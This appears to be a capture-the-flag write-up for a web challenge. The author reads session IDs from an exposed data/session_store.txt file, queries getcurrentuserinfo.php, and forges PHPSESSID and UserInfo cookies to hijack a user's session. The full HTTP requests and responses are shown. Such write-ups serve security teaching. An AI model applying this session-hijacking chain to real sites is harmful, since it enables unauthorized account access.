link : http://34.77.37.110/restricted-sessions/ 

![image](https://user-images.githubusercontent.com/67979878/127423247-a52a7868-90c4-4ad8-83e9-799ac239cb32.png)

let's use burpsuite so we can see the request and response and see what we can do .

```
GET /restricted-sessions/ HTTP/1.1
Host: 34.77.37.110
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

the response body have an interesting piece of code

```
   <script type="text/javascript">

      if(document.cookie !== ''){
        $.post('getcurrentuserinfo.php',{
          'PHPSESSID':document.cookie.match(/PHPSESSID=([^;]+)/)[1]
        },function(data){
          cu = data;
        });
      }
    </script>

```
so if cookie is not empty it will retrieve data from /getcurrentuserinfo.php 

note :The $.post() method loads data from the server using a HTTP POST request.


sending the reqeust in the repeater and add a cookie for testing 

```
GET /restricted-sessions/ HTTP/1.1
Host: 34.77.37.110
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
cookie:PHPSESSID=test
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 2

````
and here is the result :
```
HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Thu, 29 Jul 2021 02:09:37 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 43


Session not found in data/session_store.txt
```
### so let's visit this /data/session_store.txt

```
iuqwhe23eh23kej2hd2u3h2k23
11l3ztdo96ritoitf9fr092ru3
ksjdlaskjd23ljd2lkjdkasdlk

```
it seems those are valid cookies values . let's make the same previous request with any valid cookie :

```
GET /restricted-sessions/ HTTP/1.1
Host: 34.77.37.110
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
cookie:PHPSESSID=11l3ztdo96ritoitf9fr092ru3
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

response body :
`UserInfo Cookie don't have the username , Validation failed `

so it seems the cookie needs UserInfo :( 


![Alt Text](https://media.giphy.com/media/l1KVaj5UcbHwrBMqI/giphy.gif)

we see in the js code that when there is a valid cookie it will send post request to the /getcurrentuserinfo.php . so let's make it our self by sending it as a parameter 

```
POST /restricted-sessions/getcurrentuserinfo.php HTTP/1.1
Host: 34.77.37.110
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
PHPSESSID=11l3ztdo96ritoitf9fr092ru3

```
resposne body :

```
{"name":"mary","email":"mary@example.com","session_id":"11l3ztdo96ritoitf9fr092ru3"}

```

### now we have  a UserInfo we can use in the get request to the main page !



```
GET /restricted-sessions/ HTTP/1.1
Host: 34.77.37.110
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
cookie:PHPSESSID=11l3ztdo96ritoitf9fr092ru3;UserInfo=mary
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

```
showing response in browser :

![image](https://user-images.githubusercontent.com/67979878/127428308-eb6defef-be0d-47f9-a836-9e56023a9969.png)




![Alt Text](https://media.giphy.com/media/1BFEEIo4h1BuTH8eqP/giphy.gif)




